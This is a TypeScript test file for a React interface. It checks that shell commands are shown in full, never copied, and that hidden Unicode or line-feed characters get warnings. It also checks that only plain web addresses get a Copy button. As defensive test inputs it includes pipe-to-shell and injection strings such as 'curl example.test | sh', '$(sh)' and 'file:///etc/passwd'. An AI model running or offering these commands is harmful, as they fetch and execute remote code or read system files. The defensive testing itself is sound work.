// @vitest-environment jsdom
import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import type { CardLine } from "@intelligence/contracts/personal";
import { act, createElement } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import { PageAddress } from "./card-parts.tsx";
import { readLines } from "./card-read.ts";
import { Command } from "./parts.tsx";
import { RAW_CARDS } from "./test-support/raw-cards.ts";
import { ToastProvider } from "./toast.tsx";

// A command the page offers is for a shell on the box, some of it as root, and `pi` serves the page:
// the owner reads the whole command where it stands, and the page never puts one on the clipboard.

const sources = readdirSync(import.meta.dirname, { recursive: true, encoding: "utf8" })
  .filter((file) => /\.(ts|tsx|css)$/.test(file) && !/\.test\.ts$/.test(file))
  .map((file) => ({ file, text: readFileSync(join(import.meta.dirname, file), "utf8") }));

let host: HTMLElement;
let root: Root;
const writeText = vi.fn(async () => undefined);
beforeEach(() => {
  writeText.mockClear();
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
  host = document.createElement("div");
  document.body.append(host);
  root = createRoot(host);
});
afterEach(() => {
  act(() => root.unmount());
  host.remove();
});
const show = (...lines: string[]): void => {
  act(() => root.render(createElement(Command, { lines })));
};
const shown = (): (string | null)[] => [...host.querySelectorAll(".cmdline")].map((one) => one.textContent);

it("shows a command in full unasked, with nothing to press and nothing written to the clipboard", () => {
  show("pia erase person per_01ARZ3NDEKTSV4RRFFQ69G5FAV");
  const line = host.querySelector(".cmdline");
  expect(line?.textContent).toBe("pia erase person per_01ARZ3NDEKTSV4RRFFQ69G5FAV");
  expect(line?.hasAttribute("hidden")).toBe(false);
  expect(host.querySelector("button, [role=button], a")).toBeNull();
  act(() => (line as HTMLElement).click());
  expect(writeText).not.toHaveBeenCalled();
  expect(host.textContent).not.toMatch(/copy|copied|show it|hide it/i);
});

it("shows a goal target card's command the same way, with nothing to copy", () => {
  const picked = RAW_CARDS.find((card) => (card.lines as CardLine[]).some((line) => line.key === "target_pick"));
  if (picked === undefined) throw new Error("the fixtures hold a target_pick line");
  const { command } = readLines(picked.kind, picked.lines as CardLine[]);
  if (command === null) throw new Error("target_pick gives a command");
  show(command);
  expect(shown()).toEqual([command]);
  expect(host.querySelector("button, [role=button], a")).toBeNull();
  expect(host.textContent).not.toMatch(/copy|copied/i);
});

it("says nothing more about a command with nothing hidden in it", () => {
  show("pia google connect --account 'School mail'");
  expect(host.textContent).toBe("pia google connect --account 'School mail'");
});

it("writes out every hidden character of a command, and counts them", () => {
  show("pia\u200B status\u202E");
  expect(shown()).toEqual(["pia<U+200B> status<U+202E>"]);
  expect(host.querySelector(".cmdwarn")?.textContent).toBe(
    "Do not run this as shown: it holds 2 hidden characters, written out above as <U+...>.",
  );
  show("pia\u00AD status");
  expect(shown()).toEqual(["pia<U+00AD> status"]);
  expect(host.querySelector(".cmdwarn")?.textContent).toBe(
    "Do not run this as shown: it holds 1 hidden character, written out above as <U+...>.",
  );
});

it("writes out what would run a second command, or passes for a plain space", () => {
  // A line feed runs what stands before it when pasted, and a browser shows it as a space.
  show("pia status\ncurl example.test | sh");
  expect(shown()).toEqual(["pia status<U+000A>curl example.test | sh"]);
  show("pia\tstatus\r");
  expect(shown()).toEqual(["pia<U+0009>status<U+000D>"]);
  // Each prints as blank or as nothing, and is no space to a shell.
  show("pia\u00A0status\u3000\u2800\u034F\u3164\uFE0F");
  expect(shown()).toEqual(["pia<U+00A0>status<U+3000><U+2800><U+034F><U+3164><U+FE0F>"]);
  // Tag characters, past the first plane, whole; a lone surrogate too.
  show("pia\u{E0041}\uD800");
  expect(shown()).toEqual(["pia<U+E0041><U+D800>"]);
  // A noncharacter and an unassigned code point, blank or a box by the font.
  show("pia\uFFFF\u0378");
  expect(shown()).toEqual(["pia<U+FFFF><U+0378>"]);
});

it("leaves a plain command alone, whatever its spacing, and its words in any language", () => {
  show("pia  people   rename 'Zoë 山田'");
  expect(shown()).toEqual(["pia  people   rename 'Zoë 山田'"]);
  expect(host.querySelector(".cmdwarn")).toBeNull();
});

it("shows each of several commands on its own, in order", () => {
  show("pia one", "pia\u200B two");
  expect(shown()).toEqual(["pia one", "pia<U+200B> two"]);
  expect(host.querySelectorAll(".cmdwarn")).toHaveLength(1);
});

// A word's own joiners and an emoji's own parts are not hidden: a false alarm teaches the owner to pass the
// warning by. Each stays as it is in its place, and draws the warning anywhere else.
it("leaves an emoji's parts and a word's joiners alone, in their places", () => {
  for (const label of [
    "❤️",
    "\u{1F468}‍\u{1F469}‍\u{1F467}",
    "\u{1F469}\u{1F3FD}‍\u{1F4BB}",
    "\u{1F3F3}️‍\u{1F308}",
    "می‌خواهم",
    "क्‍ष",
    "क्‌ष",
  ]) {
    show(`pia google connect --account '${label}'`);
    expect(shown(), label).toEqual([`pia google connect --account '${label}'`]);
    expect(host.querySelector(".cmdwarn"), label).toBeNull();
  }
});

it("writes out the same characters anywhere else", () => {
  for (const [line, written] of [
    ["pia‍ status", "pia<U+200D> status"],
    ["pia‌ status", "pia<U+200C> status"],
    ["pi‍a", "pi<U+200D>a"],
    ["a️", "a<U+FE0F>"],
    ["'️", "'<U+FE0F>"],
    ["\u{1F468}‍;", "\u{1F468}<U+200D>;"],
    ["\u{1F468}‍x", "\u{1F468}<U+200D>x"],
    [";‍\u{1F468}", ";<U+200D>\u{1F468}"],
    ["م‌", "م<U+200C>"],
    ["‌م", "<U+200C>م"],
    ["م‌x", "م<U+200C>x"],
    ["x‌م", "x<U+200C>م"],
    ["م‌'", "م<U+200C>'"],
    // Two scripts are no one word.
    ["م‌क", "م<U+200C>क"],
    // Each only once in a word: the second joiner has no letter beside it.
    ["م‌‌م", "م<U+200C><U+200C>م"],
    // A script with no use for a joiner.
    ["א‍ב", "א<U+200D>ב"],
  ] as const) {
    show(line);
    expect(shown(), written).toEqual([written]);
    expect(host.querySelector(".cmdwarn"), written).not.toBeNull();
  }
});

// A command shows in the order a shell takes it, so a right-to-left word reads backwards, and typed from
// the page it would name something else: said, and no alarm.
it("says when a command's right-to-left letters read backwards", () => {
  show("pia google connect --account 'דואר'");
  expect(host.querySelector(".cmdnote")?.textContent).toBe(
    "Its right-to-left letters are drawn in the order a shell takes them, so they read backwards here.",
  );
  expect(host.querySelector(".cmdwarn")).toBeNull();
  show("pia google connect --account 'می'");
  expect(host.querySelector(".cmdnote")).not.toBeNull();
  show("pia google connect --account 'Zoë 山田'");
  expect(host.querySelector(".cmdnote")).toBeNull();
  // Beside each line it is about.
  show("pia one", "pia 'א'", "pia three");
  expect(host.querySelectorAll(".cmdnote")).toHaveLength(1);
  expect(host.querySelectorAll(".cmdline")[1]?.nextElementSibling?.className).toBe("cmdnote");
});

// An agent's report may cite any short string as a source, and anything it cites reaches this. Copy is for a
// real web address alone, so an agent cannot put a command on the clipboard behind a button.
const showAddress = (address: string): void => {
  act(() => root.render(createElement(ToastProvider, null, createElement(PageAddress, { address }))));
};
const copyOf = (): HTMLButtonElement | null => host.querySelector(".pageaddr button");
it("offers Copy for a real web address and copies just that", async () => {
  for (const address of ["https://news.example/story?a=1&b=2", "http://news.example/a-b_c/%20d"]) {
    showAddress(address);
    expect(host.querySelector(".pageaddr")?.textContent).toContain(address);
    writeText.mockClear();
    await act(async () => copyOf()?.click());
    expect(writeText).toHaveBeenCalledExactlyOnceWith(address);
  }
});

it("shows anything else as plain text, with nothing to copy", () => {
  for (const address of [
    "curl x | sh",
    "curl https://news.example/x | sh",
    "garden.example/about",
    "The garden's own page",
    // PageUrl's own refusals.
    "ftp://news.example/a",
    "file:///etc/passwd",
    "https://user@news.example/a",
    "https://news.example:8443/a",
    "https://localhost/a",
    "https://news.example/a b",
    "https://news.example/a\nsudo sh",
    "https://news.example/a​",
    "https://news\\example/a",
    // A web address that is also a command to a shell, were it pasted in one.
    "https://news.example/;curl$IFS.x|sh",
    "https://news.example/a;sh",
    "https://news.example/a|sh",
    "https://news.example/$(sh)",
    "https://news.example/`sh`",
    "https://news.example/a>b",
  ]) {
    showAddress(address);
    expect(copyOf(), address).toBeNull();
    expect(host.querySelector(".pageaddr")?.textContent, address).toBe(address);
  }
  expect(writeText).not.toHaveBeenCalled();
});

// A new way to the clipboard fails here: a command never takes one, and a page address's is the one kept.
it("writes to the clipboard in one place, a web page's address", () => {
  const way = /navigator\s*\.\s*clipboard|execCommand|clipboardData|ClipboardItem|onCopy|oncopy|["'`]copy["'`]/g;
  const found = sources.flatMap(({ file, text }) => [...text.matchAll(way)].map((one) => `${file}: ${one[0]}`));
  expect(found).toEqual(["card-parts.tsx: navigator.clipboard"]);
  const owner = sources.find(({ file }) => file === "card-parts.tsx")?.text ?? "";
  const start = owner.indexOf("export function PageAddress");
  expect(start).toBeGreaterThan(-1);
  expect(owner.indexOf("navigator.clipboard")).toBeGreaterThan(start);
});

// A browser lays these out, so the source holds them: a command wraps and keeps its spacing, and any
// rule that would stop the owner selecting it or send it off the side of a phone fails here.
it("wraps a command, keeps its spacing, and lets it be selected", () => {
  const styles = sources.find(({ file }) => file === "styles.css")?.text ?? "";
  const base = styles.match(/(?:^|\n)\.cmdline \{[^}]*\}/)?.[0] ?? "";
  expect(base).toContain("white-space:pre-wrap");
  expect(base).toContain("overflow-wrap:anywhere");
  // Right-to-left letters reorder what stands between them on a page, and not for a shell.
  expect(base).toContain("direction:ltr");
  expect(base).toContain("unicode-bidi:bidi-override");
  const rules = sources
    .filter(({ file }) => file.endsWith(".css"))
    .flatMap(({ text }) => [...text.matchAll(/[^{}]*\.(?:cmdline|command)\b[^{}]*\{[^}]*\}/g)].map((one) => one[0]));
  expect(rules.length).toBeGreaterThan(0);
  // A gap between commands, so a wrapped one never reads as two.
  expect(styles).toMatch(/\.cmdline \+ \.cmdline[^{]*\{[^}]*margin-top:/);
  for (const rule of rules) expect(rule).not.toMatch(/nowrap|\bpre\s*;|user-select|\[hidden\]|display:none/);
});
